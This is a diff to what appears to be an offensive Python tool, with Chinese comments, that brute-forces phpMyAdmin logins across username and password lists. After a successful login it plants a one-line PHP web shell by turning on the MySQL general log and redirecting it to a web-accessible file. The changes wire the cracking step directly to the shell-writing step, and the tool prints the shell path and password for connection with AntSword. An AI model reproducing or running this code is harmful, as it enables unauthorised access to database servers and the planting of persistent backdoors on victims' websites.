@@ -6,6 +6,7 @@ import aiofiles
 import asyncio
 import time
 import multiprocessing
+import json
 
 # 使用IP域名时，需要设置cookie
 jar = aiohttp.CookieJar(unsafe=True)
@@ -82,7 +83,8 @@ async def phpmyadmin_crack(host, username, password, limit):
                             "lang": "zh_CN",
                             "token": token_value
                         }
-                        second_code, second_response = await handle_request(session=session, url=login_url, method="POST",
+                        second_code, second_response = await handle_request(session=session, url=login_url,
+                                                                            method="POST",
                                                                             data=login_data)
                         if second_response is None:
                             return False, False
@@ -91,20 +93,21 @@ async def phpmyadmin_crack(host, username, password, limit):
                         else:
                             # 首页
                             index_url = host + "/phpmyadmin/main.php?token={}".format(token_value)
-                            index_code, index_response = await handle_request(session=session, url=index_url, method="GET")
+                            index_code, index_response = await handle_request(session=session, url=index_url,
+                                                                              method="GET")
                             if not index_response:
                                 return False, False
                             if index_code == 200:
                                 if "常规设置" in index_response:
                                     print("登录成功:用户名为{u},密码为{p}".format(u=username, p=password))
-                                    return True, token_value
+                                    return True, token_value, session
                                 else:
                                     return False, False
                             else:
                                 return False, False
 
 
-def write_trojan(token_value, host):
+async def write_trojan(session, token_value, host):
     """写入木马"""
     sql_data = {
         "is_js_confirmed": 0,
@@ -126,8 +129,9 @@ def write_trojan(token_value, host):
         }
     )
     sql_url = host + "/phpmyadmin/import.php"
-    sql_log_on_response = handle_request(session=session, url=sql_url, method="POST", data=sql_data)
-    sql_log_on = sql_log_on_response.json()
+    sql_log_on_code, sql_log_on_response = await handle_request(session=session, url=sql_url, method="POST",
+                                                                data=sql_data)
+    sql_log_on = json.loads(sql_log_on_response)
     if sql_log_on.get("success"):
         print("日志开关已打开")
     else:
@@ -141,9 +145,9 @@ def write_trojan(token_value, host):
             "sql_query": "set global general_log_file = '{}';".format(path)
         }
     )
-    sql_log_path_response = handle_request(session=session, url=sql_url, method="POST",
-                                           data=sql_data)
-    sql_log_path = sql_log_path_response.json()
+    sql_log_path_code, sql_log_path_response = await handle_request(session=session, url=sql_url, method="POST",
+                                                                    data=sql_data)
+    sql_log_path = json.loads(sql_log_path_response)
     if sql_log_path.get("success"):
         print("日志路径设置成功")
     else:
@@ -156,12 +160,9 @@ def write_trojan(token_value, host):
         }
     )
     print("开始写入一句话木马")
-    # header = {
-    #     "referer": host + "/phpmyadmin/server_sql.php?token={}".format(token_value)
-    # }
-    trojan_response = handle_request(session=session, url=sql_url, method="POST", data=sql_data)
+    trojan_code, trojan_response = await handle_request(session=session, url=sql_url, method="POST", data=sql_data)
     if trojan_response:
-        if trojan_response.status_code == 200:
+        if trojan_code == 200:
             print("一句话木马路径: {},密码test,请使用蚁剑连接".format(host + "/" + trojan_file))
             return True
     else:
@@ -190,19 +191,23 @@ def handle_user_pass():
     user_password_loop.run_until_complete(async_handle_user_pass())
 
 
-async def async_handle_login(host, limit):
+async def async_handle_login_and_write_trojan(host, limit):
     for username in username_list:
         tasks = [asyncio.create_task(phpmyadmin_crack(host, username, password, limit)) for password in password_list]
         done, pending = await asyncio.wait(tasks)
-        print(done)
+        for i in done:
+            login_return = i.result()
+            if login_return[0]:
+                # 写入一句话
+                await write_trojan(login_return[2], login_return[1], host)
 
 
-def handle_login(host, limit):
+def handle_login_and_write_trojan(host, limit):
     # 多线程中协程Loop标记
     # new_login_loop = asyncio.new_event_loop()
     # asyncio.set_event_loop(new_login_loop)
     login_loop = asyncio.get_event_loop()
-    login_loop.run_until_complete(async_handle_login(host, limit))
+    login_loop.run_until_complete(async_handle_login_and_write_trojan(host, limit))
 
 
 def main(host, limit):
@@ -210,11 +215,9 @@ def main(host, limit):
     up = multiprocessing.Process(target=handle_user_pass)
     up.start()
     up.join()
-    login = multiprocessing.Process(target=handle_login, args=(host,limit,))
+    login = multiprocessing.Process(target=handle_login_and_write_trojan, args=(host, limit,))
     login.start()
     login.join()
-    # if login_result:
-    #     write_trojan(token_value=login_result, host=host)
 
 
 if __name__ == '__main__':
